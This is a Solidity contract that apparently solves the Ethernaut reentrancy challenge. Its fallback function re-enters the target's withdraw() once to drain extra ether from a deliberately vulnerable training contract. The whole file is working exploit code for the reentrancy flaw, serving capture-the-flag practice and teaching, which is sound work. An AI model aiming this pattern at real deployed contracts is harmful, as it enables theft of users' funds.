// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Ownable2Step } from "@openzeppelin-contracts/access/Ownable2Step.sol";
import { IReentrance } from "ethernaut/10-reentrancy/IReentrance.sol";

contract ReentranceAttacker is Ownable2Step {
    bool private s_flag;

    constructor() payable {
        // solhint-disable-previous-line no-empty-blocks
    }

    function exploit(address _reentrance, uint256 _amount) external onlyOwner {
        // NB: minimalistic version
        IReentrance(payable(_reentrance)).withdraw(_amount);
    }

    // solhint-disable-next-line no-complex-fallback
    fallback() external payable {
        // NB: msg.value expected to be 0.009 ether
        if (!s_flag) {
            IReentrance reentrance = IReentrance(payable(msg.sender));
            s_flag = true;
            (bool success,) = payable(reentrance).call(abi.encodeCall(reentrance.withdraw, (msg.value)));
            // solhint-disable-previous-line avoid-low-level-calls
        }
    }
}
